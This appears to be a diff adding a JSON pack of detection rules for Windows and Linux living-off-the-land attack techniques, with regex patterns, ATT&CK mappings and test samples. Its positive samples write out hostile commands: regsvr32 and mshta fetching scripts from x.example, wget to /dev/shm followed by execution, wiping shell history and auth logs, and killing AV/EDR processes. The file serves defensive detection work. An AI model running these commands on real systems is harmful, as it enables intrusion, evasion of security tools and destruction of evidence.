@@ -1,0 +1,556 @@
+{
+ "pack": "lolbin",
+ "rules": [
+  {
+   "id": "byte-lol-regsvr32-squiblydoo",
+   "name": "regsvr32 scriptlet execution from a URL",
+   "description": "regsvr32 /s /n /u /i:URL scrobj.dll.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.010",
+   "severity": "high",
+   "weight": 50,
+   "applies_to": "both",
+   "format": "any",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "regsvr32(?:\\.exe)?\\s+[^\\n]{0,40}/i:https?://[^\\s]+\\s+[^\\n]{0,20}scrobj(?:\\.dll)?",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "str": "a"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll"
+     }
+    ],
+    "negative": [
+     {
+      "text": "regsvr32 /s mylib.dll"
+     },
+     {
+      "text": "scrobj.dll"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-lol-mshta-url",
+   "name": "mshta fetching remote content",
+   "description": "mshta with an http(s) URL or javascript:/vbscript: protocol argument.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.005",
+   "severity": "high",
+   "weight": 45,
+   "applies_to": "both",
+   "format": "any",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "\\bmshta(?:\\.exe)?\\s+(?:https?://|(?:vb|java)script:)",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "str": "a"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "mshta http://x.example/payload.hta"
+     }
+    ],
+    "negative": [
+     {
+      "text": "mshta C:\\apps\\help.hta"
+     },
+     {
+      "text": "mshta"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-lol-rundll32-script",
+   "name": "rundll32 launching script protocol or remote DLL",
+   "description": "rundll32 javascript:, or a UNC/URL-loaded DLL.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.011",
+   "severity": "high",
+   "weight": 45,
+   "applies_to": "both",
+   "format": "any",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "rundll32(?:\\.exe)?\\s+(?:javascript:|vbscript:|\\\\\\\\[^\\\\\\s]+\\\\[^\\s,]+\\.dll|https?://)",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "str": "a"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert(1)"
+     }
+    ],
+    "negative": [
+     {
+      "text": "rundll32.exe shell32.dll,Control_RunDLL"
+     },
+     {
+      "text": "javascript:"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-lol-wmic-process-create",
+   "name": "WMIC process call create with a shell or script",
+   "description": "wmic process call create launching cmd/powershell/mshta.",
+   "tactic": "Execution",
+   "technique": "T1047",
+   "severity": "medium",
+   "weight": 28,
+   "applies_to": "both",
+   "format": "any",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "wmic(?:\\.exe)?\\s+(?:/node:\\S+\\s+)?process\\s+call\\s+create\\s+['\\\"]?\\s*(?:cmd|powershell|mshta|wscript|cscript|rundll32)",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "str": "a"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "wmic /node:10.0.0.7 process call create \"cmd.exe /c whoami\""
+     }
+    ],
+    "negative": [
+     {
+      "text": "wmic process list brief"
+     },
+     {
+      "text": "process call create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-lol-certutil-decode",
+   "name": "certutil decode of a staged blob",
+   "description": "certutil -decode / -decodehex turning a text file into a binary.",
+   "tactic": "Defense Evasion",
+   "technique": "T1140",
+   "severity": "medium",
+   "weight": 25,
+   "applies_to": "both",
+   "format": "any",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "certutil(?:\\.exe)?\\s+[^\\n]{0,30}-decode(?:hex)?\\s+\\S+\\s+\\S+\\.(?:exe|dll|ps1|bat|vbs|js)",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "str": "a"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "certutil -decode a.txt a.exe"
+     }
+    ],
+    "negative": [
+     {
+      "text": "certutil -decode a.txt a.crt"
+     },
+     {
+      "text": "certutil -hashfile"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-lol-eventlog-clear-script",
+   "name": "Event log clearing command",
+   "description": "wevtutil cl, Clear-EventLog or Remove-EventLog.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.001",
+   "severity": "medium",
+   "weight": 28,
+   "applies_to": "both",
+   "format": "any",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "wevtutil(?:\\.exe)?\\s+cl\\s+(?:security|system|application)|Clear-EventLog\\s+-LogName\\s+\\w+|wevtutil\\s+clear-log",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "str": "a"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "wevtutil cl Security"
+     }
+    ],
+    "negative": [
+     {
+      "text": "wevtutil qe Security /c:5"
+     },
+     {
+      "text": "Get-EventLog -LogName Security"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-lol-base64-pipe-shell",
+   "name": "Base64 decoded straight into a shell",
+   "description": "echo/printf of a long base64 blob piped through base64 -d into sh/bash/python.",
+   "tactic": "Defense Evasion",
+   "technique": "T1027",
+   "severity": "high",
+   "weight": 45,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "(?:echo|printf)\\s+['\\\"]?[A-Za-z0-9+/=]{40,}['\\\"]?\\s*\\|\\s*base64\\s+(?:-d|--decode|-D)\\s*\\|\\s*(?:sudo\\s+)?(?:ba|z)?sh\\b"
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "base64\\s+(?:-d|--decode)\\s*<<<\\s*['\\\"]?[A-Za-z0-9+/=]{40,}['\\\"]?\\s*\\|\\s*(?:ba)?sh"
+    }
+   ],
+   "condition": {
+    "any": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "echo aWQgPiAvdG1wL3gudHh0OyBlY2hvIGhlbGxvID4+IC90bXAveC50eHQ7IHVuYW1lIC1h | base64 -d | bash"
+     }
+    ],
+    "negative": [
+     {
+      "text": "echo aGVsbG8= | base64 -d"
+     },
+     {
+      "text": "echo aWQgPiAvdG1wL3gudHh0OyBlY2hvIGhlbGxvID4+IC90bXAveC50eHQ7IHVuYW1lIC1h | base64 -d > out.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-lol-curl-pipe-shell-tmp",
+   "name": "Download piped to shell with a hidden staging path",
+   "description": "curl/wget output piped into a shell together with /dev/shm or /tmp hidden-file staging and chmod. Plain 'curl | sh' installers are common, so the staging path is required.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "severity": "medium",
+   "weight": 28,
+   "applies_to": "both",
+   "format": "script",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "(?:curl|wget)\\s+[^\\n|]{0,120}(?:-s|-q|-fsSL|-O-)[^\\n|]{0,120}\\|\\s*(?:sudo\\s+)?(?:ba)?sh\\b"
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "/dev/shm/\\.?\\w+|/tmp/\\.\\w+|/var/tmp/\\.\\w+"
+    },
+    {
+     "name": "c",
+     "type": "ascii",
+     "value": "chmod +x"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     },
+     {
+      "str": "c"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "curl -s http://x.example/a | sh; cp x /dev/shm/.k; chmod +x /dev/shm/.k"
+     }
+    ],
+    "negative": [
+     {
+      "text": "curl -fsSL https://get.example.com/install.sh | sh"
+     },
+     {
+      "text": "chmod +x /tmp/.k /dev/shm/.k"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-lol-history-wipe",
+   "name": "Shell history and log wiping",
+   "description": "unset HISTFILE / history -c / HISTSIZE=0 with log truncation of /var/log.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.003",
+   "severity": "medium",
+   "weight": 25,
+   "applies_to": "both",
+   "format": "script",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "h",
+     "type": "regex",
+     "value": "unset\\s+HISTFILE|history\\s+-c\\b|HISTFILESIZE=0|HISTSIZE=0|ln\\s+-sf\\s+/dev/null\\s+~?/?\\.?\\w*history"
+    },
+    {
+     "name": "l",
+     "type": "regex",
+     "value": ">\\s*/var/log/(?:auth\\.log|secure|wtmp|lastlog|syslog|messages)|rm\\s+-[rf]+\\s+/var/log/\\S+|truncate\\s+-s\\s*0\\s+/var/log/\\S+"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "h"
+     },
+     {
+      "str": "l"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "unset HISTFILE; history -c; > /var/log/auth.log"
+     }
+    ],
+    "negative": [
+     {
+      "text": "history -c"
+     },
+     {
+      "text": "> /var/log/auth.log"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-lol-selinux-fw-off",
+   "name": "Security controls disabled in one script",
+   "description": "setenforce 0 / ufw disable / iptables -F / stopping auditd and AV in the same script.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.004",
+   "severity": "medium",
+   "weight": 28,
+   "applies_to": "both",
+   "format": "script",
+   "tags": [
+    "noisy-risk"
+   ],
+   "strings": [
+    {
+     "name": "a",
+     "type": "ascii",
+     "value": "setenforce 0"
+    },
+    {
+     "name": "b",
+     "type": "ascii",
+     "value": "ufw disable"
+    },
+    {
+     "name": "c",
+     "type": "ascii",
+     "value": "iptables -F"
+    },
+    {
+     "name": "d",
+     "type": "regex",
+     "value": "systemctl\\s+(?:stop|disable)\\s+(?:auditd|firewalld|apparmor|clamav|falcon-sensor|crowdstrike|wazuh-agent|ossec)"
+    },
+    {
+     "name": "e",
+     "type": "ascii",
+     "value": "service iptables stop"
+    }
+   ],
+   "condition": {
+    "n_of": {
+     "count": 2,
+     "of": [
+      "a",
+      "b",
+      "c",
+      "d",
+      "e"
+     ]
+    }
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "setenforce 0\nufw disable\n"
+     }
+    ],
+    "negative": [
+     {
+      "text": "setenforce 0"
+     },
+     {
+      "text": "iptables -F"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-lol-kill-security-tools",
+   "name": "Process kill list of security products",
+   "description": "taskkill /f against several named AV/EDR processes.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "severity": "high",
+   "weight": 40,
+   "applies_to": "both",
+   "format": "any",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "taskkill(?:\\.exe)?\\s+[^\\n]{0,20}/f[^\\n]{0,20}/im\\s+(?:msmpeng|mbam|avp|egui|savservice|sophos\\w*|csfalcon\\w*|cb|carbonblack\\w*|sentinel\\w*|mcafee\\w*)\\.exe",
+     "nocase": true,
+     "min": 2
+    }
+   ],
+   "condition": {
+    "str": "a"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "taskkill /f /im MsMpEng.exe\ntaskkill /f /im avp.exe"
+     }
+    ],
+    "negative": [
+     {
+      "text": "taskkill /f /im notepad.exe"
+     },
+     {
+      "text": "taskkill /f /im MsMpEng.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-lol-tmp-dev-shm-exec",
+   "name": "Execution from /dev/shm after download",
+   "description": "A script that downloads into /dev/shm, makes it executable and starts it detached.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "severity": "medium",
+   "weight": 30,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "(?:curl|wget)\\s+[^\\n]{0,120}(?:-o|-O)\\s*/dev/shm/\\S+"
+    },
+    {
+     "name": "b",
+     "type": "ascii",
+     "value": "chmod"
+    },
+    {
+     "name": "c",
+     "type": "regex",
+     "value": "nohup\\s+/dev/shm/|/dev/shm/\\S+\\s*&|setsid\\s+/dev/shm/"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     },
+     {
+      "str": "c"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "wget http://x.example/b -O /dev/shm/b; chmod +x /dev/shm/b; nohup /dev/shm/b &"
+     }
+    ],
+    "negative": [
+     {
+      "text": "wget http://x.example/b -O /dev/shm/b; chmod +x /dev/shm/b"
+     },
+     {
+      "text": "nohup /dev/shm/b &"
+     }
+    ]
+   }
+  }
+ ]
+}
